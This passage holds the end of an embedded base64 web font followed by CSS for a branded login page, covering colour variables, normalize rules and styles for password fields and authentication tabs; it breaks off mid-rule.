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)format("woff2")
            }


            :root {
                --font-family: "Source Sans Pro";
                --text-font-size-xxs: 1.3rem;
                --text-font-size-menu: 1.6rem;
                --text-font-size-xs: 1.1rem;
                --text-font-size-sm: 1.3rem;
                --text-font-size-md: 1.4rem;
                --text-font-size-lg: 1.6rem;
                --text-font-size-xl: 1.8rem;
                --text-font-size-xxl: 2.5rem;
                --heading-font-size-1: 1.4rem;
                --heading-font-size-2: 2rem;
                --heading-font-size-3: 1.6rem;
                --heading-font-size-4: 1.4rem;
                --heading-font-size-5: 1.2rem;
                --heading-font-size-6: 1rem;
                --heading-font-weight: normal
            }

            @media(min-width: 49rem) {
                :root {
                    --text-font-size-xs:1.2rem;
                    --text-font-size-sm: 1.4rem;
                    --text-font-size-md: 1.6rem;
                    --text-font-size-lg: 1.8rem;
                    --text-font-size-xl: 2.2rem;
                    --text-font-size-xxl: 3rem;
                    --heading-font-size-1: 3rem;
                    --heading-font-size-2: 2.2rem;
                    --heading-font-size-3: 1.8rem;
                    --heading-font-size-4: 1.6rem;
                    --heading-font-size-5: 1.4rem;
                    --heading-font-size-6: 1.2rem;
                    --label-font-weight: 600
                }
            }

            body {
                background-image: none;
                font-family: var(--font-family);
                font-size: var(--text-font-size-md)
            }

            @media screen and (max-width: 37.4375em) {
                body {
                    background-color:var(--color-white)
                }
            }

            .auth .o-layout {
                min-height: calc(100vh - 32rem);
                position: relative
            }

            @media(min-width: 1090px) {
                .auth .o-layout {
                    min-height:calc(100vh - 22rem)
                }

                .na-hero {
                    background-image: url(./bg.png)
                }
            }

            :root {
                --color-a-link: var(--color-azure);
                --color-a-link-hover: var(--color-axa-blue);
                --color-a-link-focus: var(--color-deep-saphire);
                --color-btn-primary: var(--color-green);
                --color-btn-primary-hover: var(--color-forest);
                --color-btn-primary-focus: var(--color-forest);
                --btn-border-radius: 0;
                --btn-outlined-color: var(--color-azure);
                --btn-outlined-border-color: var(--color-azure);
                --color-btn-primary-outlined-bg-hover: var(--color-azure);
                --color-btn-primary-outlined-txt-hover: var(--color-white);
                --color-btn-primary-outlined-hover: var(--color-azure);
                --color-btn-secondary: var(--color-azure);
                --color-btn-secondary-hover: var(--color-azure);
                --color-btn-secondary-bg-hover: var(--color-azure);
                --color-btn-secondary-txt-hover: var(--color-white);
                --color-btn-secondary-focus: var(--color-azure);
                --color-btn-secondary-bg-focus: var(--color-azure);
                --color-btn-secondary-txt-focus: var(--color-white);
                --color-btn-tertiary: var(--color-azure);
                --color-btn-tertiary-hover: var(--color-axa-blue);
                --color-btn-tertiary-focus: var(--color-deep-saphire);
                --color-input-border: var(--color-secondary-light);
                --color-input-hover: var(--color-secondary-darker);
                --bordercolor-segment-hover: var(--color-azure);
                --color-segment-hover: var(--color-azure);
                --bgcolor-segment-checked: var(--color-azure);
                --color-segment-checked: var(--color-white);
                --checkbox-checked-color: var(--color-azure);
                --checkbox-border-color: var(--color-mine-shaft);
                --message-border-color: var(--color-azure);
                --message-bg-color: var(--color-ghost-white);
                --message-icon-color: var(--color-azure);
                --back-link-padding: .4rem;
                --steps-item-size-mobile: 3rem;
                --steps-item-size-desktop: 3rem;
                --header-btn-radius: 0;
                --header-btn-color: var(--color-azure);
                --header-btn-color-focus: var(--color-primary);
                --header-profil-border-color: var(--color-mercury);
                --header-profil-border-radius: 0;
                --header-profil-border-padding-right: var(--spacing-sm);
                --header-profil-color: var(--color-azure);
                --header-profil-connexion-color: inherit;
                --login-icon-margin-right: var(--spacing-sm);
                --chip-border-radius: var(--border-radius-lg);
                --tile-border-radius: 20px
            }

            *,:after,:before {
                box-sizing: border-box
            }

            /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */
            main {
                display: block
            }

            a {
                background-color: initial
            }

            strong {
                font-weight: bolder
            }

            img {
                border-style: none
            }

            button {
                font-size: 100%
            }

            button,input {
                overflow: visible
            }

            button {
                text-transform: none
            }

            [type=button],button {
                -webkit-appearance: button
            }

            ::-webkit-file-upload-button {
                -webkit-appearance: button;
                font: inherit
            }

            body,html {
                overflow-x: hidden
            }

            form,h2,p {
                margin: 0;
                padding: 0
            }

            button,input {
                font: inherit
            }

            a {
                color: inherit;
                cursor: pointer;
                text-decoration: none
            }

            html {
                color: var(--color-text);
                font-family: var(--font-family);
                font-size: 10px;
                min-height: 100%;
                overflow-y: auto;
                -webkit-text-size-adjust: 100%;
                -moz-osx-font-smoothing: grayscale;
                -webkit-font-smoothing: antialiased;
                scroll-behavior: smooth
            }

            body,html {
                line-height: 1.3
            }

            body {
                margin: 0;
                padding: 0
            }

            :root {
                --border-radius-circle: 50%
            }

            @font-face {
                .legacy {
                    font-family: "Source Sans Pro";
                    font-style: normal;
                    font-weight: 400;
                    src: local("Source Sans Pro Regular"),local("SourceSansPro-Regular"),url(../axb/fonts/sourcesanspro-regular.woff2) format("woff2"),url(../axb/fonts/sourcesanspro-regular.woff) format("woff")
                }
            }

            @font-face {
                .legacy {
                    font-family: "Source Sans Pro";
                    font-style: normal;
                    font-weight: 600;
                    src: local("Source Sans Pro Bold"),local("SourceSansPro-Bold"),url(../axb/fonts/sourcesanspro-semi-bold.woff2) format("woff2"),url(../axb/fonts/fonts/SourceSansPro-SemiBold.ttf) format("truetype")
                }
            }

            .legacy *,.legacy ::after,.legacy ::before {
                box-sizing: inherit
            }

            .legacy button {
                -webkit-appearance: none;
                -moz-appearance: none;
                -ms-appearance: none;
                -o-appearance: none;
                appearance: none;
                background-color: #47a80d;
                border-radius: 3px;
                cursor: pointer;
                font-family: "Source Sans Pro";
                -webkit-font-smoothing: antialiased;
                text-decoration: none;
                user-select: none;
                vertical-align: middle
            }

            .legacy button:disabled {
                cursor: not-allowed
            }

            .legacy input {
                color: inherit
            }

            .legacy label {
                font-family: "Source Sans Pro"
            }

            .legacy input:not([type]),.legacy input[type=password] {
                background-color: #fff;
                border: 1px solid #333;
                border-radius: 3px;
                box-shadow: inset 0 1px 3px rgba(0,0,0,.06);
                box-sizing: border-box;
                font-family: "Source Sans Pro";
                font-size: 1.8em;
                margin-bottom: .6em;
                padding: .4em;
                transition: border-color;
                width: 100%
            }

            .legacy input:not([type]):hover,.legacy input[type=color]:hover,.legacy input[type=date]:hover,.legacy input[type=datetime-local]:hover,.legacy input[type=datetime]:hover,.legacy input[type=email]:hover,.legacy input[type=month]:hover,.legacy input[type=number]:hover,.legacy input[type=password]:hover,.legacy input[type=search]:hover,.legacy input[type=tel]:hover,.legacy input[type=text]:hover,.legacy input[type=time]:hover,.legacy input[type=url]:hover,.legacy input[type=week]:hover,.legacy select[multiple=multiple]:hover,.legacy textarea:hover {
                border-color: #1a1a1a
            }

            .legacy input:not([type]):focus,.legacy input[type=color]:focus,.legacy input[type=date]:focus,.legacy input[type=datetime-local]:focus,.legacy input[type=datetime]:focus,.legacy input[type=email]:focus,.legacy input[type=month]:focus,.legacy input[type=number]:focus,.legacy input[type=password]:focus,.legacy input[type=search]:focus,.legacy input[type=tel]:focus,.legacy input[type=text]:focus,.legacy input[type=time]:focus,.legacy input[type=url]:focus,.legacy input[type=week]:focus,.legacy select[multiple=multiple]:focus,.legacy textarea:focus {
                border-color: #3032c1;
                box-shadow: inset 0 1px 3px rgba(0,0,0,.06),0 0 5px rgba(43,45,173,.7);
                outline: 0
            }

            .legacy input:not([type]):disabled,.legacy input[type=color]:disabled,.legacy input[type=date]:disabled,.legacy input[type=datetime-local]:disabled,.legacy input[type=datetime]:disabled,.legacy input[type=email]:disabled,.legacy input[type=month]:disabled,.legacy input[type=number]:disabled,.legacy input[type=password]:disabled,.legacy input[type=search]:disabled,.legacy input[type=tel]:disabled,.legacy input[type=text]:disabled,.legacy input[type=time]:disabled,.legacy input[type=url]:disabled,.legacy input[type=week]:disabled,.legacy select[multiple=multiple]:disabled,.legacy textarea:disabled {
                background-color: #f0f0f0;
                cursor: not-allowed;
                -webkit-text-fill-color: #333;
                -webkit-opacity: 1;
                opacity: 1;
                color: #333
            }

            .legacy input:not([type]):disabled:hover,.legacy input[type=color]:disabled:hover,.legacy input[type=date]:disabled:hover,.legacy input[type=datetime-local]:disabled:hover,.legacy input[type=datetime]:disabled:hover,.legacy input[type=email]:disabled:hover,.legacy input[type=month]:disabled:hover,.legacy input[type=number]:disabled:hover,.legacy input[type=password]:disabled:hover,.legacy input[type=search]:disabled:hover,.legacy input[type=tel]:disabled:hover,.legacy input[type=text]:disabled:hover,.legacy input[type=time]:disabled:hover,.legacy input[type=url]:disabled:hover,.legacy input[type=week]:disabled:hover,.legacy select[multiple=multiple]:disabled:hover,.legacy textarea:disabled:hover {
                border: 1px solid #333
            }

            .legacy h2 {
                font-family: "Source Sans Pro";
                line-height: normal
            }


            .legacy h2 {
                margin: 0
            }

            .legacy a:not([class^=btn]) {
                color: #3032c1
            }

            .legacy a:not([class^=btn]):focus,.legacy a:not([class^=btn]):hover {
                color: #00008f
            }

            .legacy a:not([class^=btn]):active {
                color: #00005b
            }

            .legacy a:not([class^=btn]):focus {
                -moz-box-shadow: 0 0 3px 1px #00008f;
                -webkit-box-shadow: 0 0 3px 1px #00008f;
                -o-box-shadow: 0 0 3px 1px #00008f;
                box-shadow: 0 0 3px 1px #00008f
            }

            .legacy button,.legacy label {
                font-weight: 400
            }

            .legacy button {
                background: 0 0;
                border: 0;
                color: inherit;
                line-height: 1;
                margin: 0;
                padding: 0
            }

            .legacy button,.legacy button:active,.legacy button:hover {
                display: inline-block;
                text-align: center
            }

            .legacy button:focus,.legacy input[type=date]:focus,.legacy input[type=datetime-local]:focus,.legacy input[type=datetime]:focus,.legacy input[type=email]:focus,.legacy input[type=month]:focus,.legacy input[type=number]:focus,.legacy input[type=password]:focus,.legacy input[type=search]:focus,.legacy input[type=tel]:focus,.legacy input[type=text]:focus,.legacy label:focus,.legacy select:focus,.legacy textarea:focus {
                -moz-box-shadow: 0 0 3px 1px #00008f;
                -webkit-box-shadow: 0 0 3px 1px #00008f;
                -o-box-shadow: 0 0 3px 1px #00008f;
                box-shadow: 0 0 3px 1px #00008f
            }

          
            .legacy input[type=password],.legacy label {
                display: inline-block;
                max-width: 100%;
                width: auto
            }

            .legacy label {
                margin: 0;
                padding: 0
            }

            .legacy input[type=password] {
                font-size: 18px;
                border-color: #333;
                box-shadow: none;
                margin: 0;
                padding: 0 6px;
                transition: none;
                line-height: 33px
            }

            @media screen and (min-width: 37.5em) {
                .legacy input[type=password] {
                    min-height:37px;
                    line-height: 37px;
                    padding: 0 8px
                }
            }

            .legacy .accessi {
                border: 0;
                clip: rect(0 0 0 0);
                height: 1px;
                margin: -1px;
                overflow: hidden;
                padding: 0;
                position: absolute;
                width: 1px
            }

            
            .legacy .c-auth__footer #lien-acces-oublie {
                font-weight: 700
            }

            
            .legacy .c-auth {
                font-family: "Source Sans Pro";
                display: flex;
                flex-flow: column;
                justify-content: space-between;
                position: relative;
                width: 100%;
                max-width: 500px;
                margin-top: 20px;
                margin-left: auto;
                margin-right: auto;
                padding: 10px;
                background-color: #fff;
                z-index: 10
            }

            @media screen and (min-width: 37.5em) and (min-height:37.4375em) {
                .legacy .c-auth {
                    margin-top:0px;
                    width: 500px;
                    min-height: 500px;
                    padding: 20px 50px 30px;
                    border-radius: 20px;
                    box-shadow: rgba(0,0,0,0.15) 0px 15px 20px 0px
                }
            }

            .legacy .c-auth__body {
                flex-grow: 1;
                margin-bottom: 20px
            }

         
            .legacy .c-auth-id {
                display: flex;
                flex-flow: row;
                align-items: center;
                position: relative;
                background-color: #efefef;
                border-radius: 3px;
                width: 100%;
                height: 45px;
                margin-bottom: 10px
            }

            .legacy .c-auth-id::after {
                background-color: transparent
            }

            .legacy .c-auth-id__label {
                display: block;
                width: calc(100% - 50px);
                text-align: left;
                padding-left: 10px
            }

            .legacy .c-auth-id__icon-wrapper {
                position: relative;
                display: block;
                width: 50px;
                height: 45px;
                border-width: 0px 1px 0px 0px;
                border-top-style: initial;
                border-top-color: initial;
                border-right-style: solid;
                border-right-color: #fff;
                border-bottom-style: initial;
                border-bottom-color: initial;
                border-left-style: initial;
                border-left-color: initial
            }

            .legacy .c-auth-id__icon-wrapper:hover {
                background-color: #efefef;
                color: initial
            }

            .legacy .c-auth-tab {
                display: flex;
                flex-flow: row;
                color: #fff;
                font-weight: 700;
                border-radius: 3px;
                height: 45px
            }

            .legacy .c-auth-tab__item {
                font-family: "Source Sans Pro";
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 5px 10px;
                flex-basis: 50%;
                font-weight: 700;
                background-color: #7a7a7a;
                font-size: small
            }

            .legacy .c-auth-tab__item:first-of-type {
